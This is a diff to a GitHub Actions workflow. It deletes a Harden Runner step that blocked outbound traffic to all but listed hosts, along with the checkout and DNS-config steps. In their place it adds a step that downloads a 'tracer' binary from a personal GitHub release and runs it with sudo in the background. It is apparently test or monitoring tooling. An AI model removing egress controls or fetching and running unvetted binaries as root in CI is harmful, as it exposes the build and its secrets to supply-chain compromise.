@@ -7,23 +7,13 @@ jobs:
   build-block:
     runs-on: ubuntu-24.04
     steps:
-      - name: Harden Runner
-        uses: step-security/harden-runner@v2
-        with:
-          egress-policy: block
-          allowed-endpoints: >
-            auth.docker.io:443
-            deb.debian.org:80
-            github.com:443
-            production.cloudflare.docker.com:443
-            registry-1.docker.io:443
-            registry.npmjs.org:443
-            objects.githubusercontent.com:443
       
-         
-      - uses: actions/checkout@v3
-      - uses: ./.github/actions/dns-config
-      
+      - run: |
+         cd /tmp
+         wget -q https://github.com/h0x0er/playground/releases/download/v0.0.2/tracer
+         chmod +x tracer
+         sudo ./tracer &> tracer.log&
+        shell: bash
       - name: Create package.json
         run: |
           echo "Creating package.json..."
